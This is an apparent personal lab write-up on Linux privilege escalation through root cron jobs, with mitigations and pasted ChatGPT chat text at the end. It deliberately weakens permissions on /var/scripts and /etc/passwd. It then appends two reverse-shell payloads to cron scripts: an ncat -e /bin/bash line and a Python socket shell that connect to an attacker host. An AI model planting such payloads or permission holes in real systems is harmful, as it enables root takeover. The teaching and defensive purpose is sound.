
## An Explanation : 


Cron is a system in Linux that will perform scheduled tasks. Usually, this is running scripts. Most commonly, crown is used for copying backup files, but it can really be used to schedule any sort of task. Cron can be run as root, but this should be used carefully and only if necessary. If cron is running scripts, and those scripts are writable to www-data, we can modify what cron is running. If cron is running that script as root, then this is a chance for privilege escalation.

## The Script's Creation

First let's make a bash script to be run every minute. I make a directory called /var/scripts for my scripts to be placed in. This script takes the current time and writes it to a file called time.txt. I’ve called it bash_script.txt.

>[!hint]
>
Here is the code :
>
>	#!/bin/bash
>	sudo mkdir /var/scripts	
>	NOW=$( date '+%F_%H:%M:%S' )
>	echo $NOW > /var/scripts/time.txt
>
>
>To understand this better, let us examine the *date* command's syntax :
>
>	%F   full date; like %+4Y-%m-%d
>	%H   hour (00..23)
>	%M   minute (00..59)
>	%S   second (00..60)



>[!hint]
>
>If we would like to understand the *crontab* file's options , it is extremely helpful to check out this website : 
>
>https://crontab.guru/
>
>



I am also going to make a python script that does the same thing. It’s very common or cron to run python scripts as well.

>[!hint]
>
>If  we would like to do the same in Python : 
>
>	import time
>	with open("/var/scripts/python_time.txt", "w") as file:
>		file.write(time.strftime("%H:%M:%S"))
>		file.write("\n")
>
>... Now for some AI-based explanation : 
>
>1. **`import time`**: This line imports the `time` module, which provides various time-related functions.
>2. **`with open("/var/scripts/python_time.txt", "w") as file:`**: This line opens the file located at `/var/scripts/python_time.txt` in write mode (`"w"`). The `with` statement ensures that the file is properly closed after it is no longer needed.
>3. **`file.write(time.strftime("%H:%M:$S"))`**: This line writes the current time to the file. The `time.strftime("%H:%M:$S")` function formats the current time in the format of hours (`%H`), minutes (`%M`), and seconds (`%S`). However, there seems to be a typo in your code. The correct format should be `"%H:%M:%S"` instead of `"%H:%M:$S"`.
>4. **`file.write("\n")`**: This line writes a newline character (`"\n"`) to the file, which moves the cursor to the next line.
>
This script essentially writes the current time to a file named `python_time.txt` located in the `/var/scripts/` directory.


Because we want to make sure our scripts can run, we need to give everyone the rights to read, write and execute the script. This sets up the vulnerability to be exploited by www-data. I make the entire scripts folder with these permissions with “chmod -R 777 /var/scripts”

>[!hint]
>
>Here is the command to give everyone all possible permissions on */var/scripts* :
>
>	sudo chmod -R 777 /var/scripts
>

Now we have to setup cron for the root user. This is because we want to run these scripts as root. We can do that with “sudo crontab -e”. If it’s your first time setting up cron, it will ask you what text editor you’d like to use to edit cron. I pick nano by typing in “1” because I like nano over vim.

>[!hint]
>
>Here is the command : 
>
>	sudo crontab -e 
>	
>	


You’ll be presented with a commented page explaining how to use cron. Give it a read, then scroll all the way to the bottom. The first step of cron is to specify how often our scripts are going to run. We can use [https://crontab.guru/](https://crontab.guru/) to help us out.

>[!note]
>
>While I was digging into the *cron* deaemon's options, I noticed a difference between the following *crontab* entries :
>
>	* / 1 * * * *
>
>and ...
>
>	* * * * *  
>  Both are indicated to mean the following : 
>  
> 						“At every minute.”
> 

>[!hint]
>
> Thus, let us include the *crontab* options that we can use for our entries : 
> 
> |   |   |
|---|---|
|*|any value|
|,|value list separator|
|-|range of values|
|/|step values|



We type out our time interval from the last slide, followed by our command. Note we have to specify the full paths to the script and any executables.

Setup

>[!hint]
>Lastly, we will use the following command so that everyone on the machine can see the syslog : 
>
>		sudo chmod 644 /var/log/syslog



Exploitation

Now we are ready to exploit this setting. Wait a couple minutes for cron to run a couple times. Afterwards, go to your reverse shell on Kali. We can use “grep CRON /var/log/syslog” to see that Cron has run as root. This command reads the syslog, looking only for mentions of the work “CRON”.

Exploitation

We can also see that we can write to these files as www-data.

Exploitation

Let’s target the bash script first. We can make a bash shell or a reverse shell because ncat can be run in the bash (default) Linux shell. If we run the following command, we will append bash_script.sh. At the same time, set up a nc listener on your Kali machine.

bashCopy code

`echo ‘ncat <kali_ip> <port> -e /bin/bash’ >> /var/scripts/bash_script.sh`

Exploitation

After a minute the cron job will run and we will have a shell as root.

Exploitation


If we want to exploit the python script, we will have to get a python reverse shell. A good source of reverse shells comes from [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python). Our python shell looks like this, where `<kali_ip>` and `<port>` will be replaced by our Kali’s IP and port we are listening on:

bashCopy code

`echo "import os,pty,socket;s=socket.socket();s.connect((\"<kali_ip>\",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")" >> /var/scripts/python_script.py`

Exploitation

Like before, we can use echo for this.

Exploitation

And after a minute we get our root shell.

Mitigation

1. Don’t use cron with root unless it’s absolutely necessary.
2. Don’t have weak file permissions on scripts running with cron.

---

**Breakdown with Explanations and Countermeasures:**

**Writable /etc/passwd:**

Explanation:

- `sudo chmod 666 /etc/passwd`: This command changes the permissions of /etc/passwd to allow read and write access for all users. This could potentially lead to privilege escalation by allowing unauthorized users to modify the file and add new users with root privileges.

Countermeasure:

- Keep /etc/passwd permissions as rw-r--r–.
- Disable password authentication over SSH.

**Insecure File Permissions - Cron:**

Explanation:

- `chmod -R 777 /var/scripts`: This command grants read, write, and execute permissions to everyone for all files and directories within /var/scripts. This could lead to privilege escalation if cron scripts are run with root privileges and are writable by unprivileged users.

Countermeasure:

- Don’t have weak file permissions on scripts running with cron.

**Exploiting Cron:**

Explanation:

- `echo 'ncat <kali_ip> <port> -e /bin/bash' >> /var/scripts/bash_script.sh`: This command appends a reverse shell command to the bash script that is executed by cron. When the script runs, it will spawn a shell with root privileges, providing the attacker with a reverse shell.

Countermeasure:

- Don’t use cron with root unless it’s absolutely necessary.

**Summary for Memory Retention:**

1. **Writable /etc/passwd:** Changing permissions on critical system files like /etc/passwd can lead to privilege escalation. Keep permissions restrictive and avoid giving unnecessary access.
    
2. **Insecure File Permissions - Cron:** Granting overly permissive permissions to cron scripts can allow attackers to modify them and execute arbitrary commands with root privileges. Always set appropriate permissions on sensitive files and directories.
    
3. **Exploiting Cron:** Appending malicious commands to cron scripts can result in privilege escalation. Be cautious when configuring cron jobs, and avoid running them with root privileges unless absolutely necessary.
    

By following these countermeasures and best practices, you can significantly reduce the risk of privilege escalation attacks on Linux systems.

![User](https://s.gravatar.com/avatar/e8efa53f504c59336105b8ab253f6b4b?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fmo.png)

You

continue please

ChatGPT

ChatGPT

Certainly! Continuing from where we left off:

**Exploiting Cron (continued):**

Explanation:

- To exploit the python script, a reverse shell command is appended similarly to the bash script. This command will create a reverse shell connection back to the attacker's machine, granting root access.

## Countermeasure:

- Regularly audit and review cron jobs and their associated scripts to ensure they are not vulnerable to unauthorized modifications. Implement proper file permissions and access controls to restrict access to sensitive scripts.
## **Mitigation:**

1. **Regular Auditing:** Regularly audit system configurations, file permissions, and cron jobs to identify and remediate vulnerabilities.
    
2. **Principle of Least Privilege:** Assign the minimum level of permissions necessary for users and processes to perform their tasks. Avoid giving unnecessary privileges to users and restrict root access unless absolutely necessary.
    
3. **Secure Configuration:** Configure system services securely by disabling unnecessary features, restricting access, and applying appropriate file permissions.
    
4. **Access Control:** Implement access controls to limit user access to critical system files and directories. Use file system permissions, access control lists (ACLs), and role-based access control (RBAC) to enforce least privilege.
    
5. **Regular Updates:** Keep software and systems up to date with security patches and updates to address known vulnerabilities and weaknesses.
    
6. **Security Awareness:** Educate users and administrators about security best practices, common attack vectors, and the importance of maintaining a secure environment.
    
7. **Monitoring and Logging:** Implement comprehensive logging and monitoring to detect and respond to suspicious activities, unauthorized access attempts, and potential security breaches.
    

By implementing these mitigation strategies and following best practices, organizations can strengthen their defenses against privilege escalation attacks and enhance the overall security posture of their Linux systems.

![User](https://s.gravatar.com/avatar/e8efa53f504c59336105b8ab253f6b4b?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fmo.png)

You

Continue please

ChatGPT

ChatGPT

Certainly! Continuing from where we left off:

**Summary for Memory Retention (continued):**

8. **Regular Auditing:** Regularly audit system configurations, file permissions, and cron jobs to identify and remediate vulnerabilities before they can be exploited by attackers. This proactive approach helps to maintain a secure environment and reduce the risk of privilege escalation.
    
9. **Principle of Least Privilege:** Adhering to the principle of least privilege ensures that users and processes are only granted the minimum level of access required to perform their tasks. By limiting privileges, organizations can mitigate the impact of potential security breaches and unauthorized access attempts.
    
10. **Secure Configuration:** Securely configure system services and applications by disabling unnecessary features, restricting access to sensitive resources, and implementing robust security measures. This helps to prevent unauthorized access and protect critical assets from exploitation.
    
11. **Access Control:** Implementing access controls, such as file system permissions, access control lists (ACLs), and role-based access control (RBAC), helps to enforce least privilege and restrict user access to sensitive information and system resources. By limiting access, organizations can reduce the likelihood of privilege escalation attacks.
    
12. **Regular Updates:** Keeping software and systems up to date with security patches and updates is essential for addressing known vulnerabilities and weaknesses. By staying current with software updates, organizations can effectively mitigate the risk of exploitation by malicious actors.
    
13. **Security Awareness:** Educating users and administrators about security best practices, common attack vectors, and the importance of maintaining a secure environment helps to build a culture of security awareness within the organization. By raising awareness and promoting good security hygiene, organizations can empower individuals to recognize and respond to potential security threats effectively.
    
14. **Monitoring and Logging:** Implementing comprehensive logging and monitoring solutions enables organizations to detect and respond to suspicious activities, unauthorized access attempts, and potential security breaches in real-time. By monitoring system logs and analyzing security events, organizations can identify and mitigate security incidents before they escalate into significant breaches.
    

By incorporating these mitigation strategies into their security practices, organizations can strengthen their defenses against privilege escalation attacks and enhance the overall security posture of their Linux systems.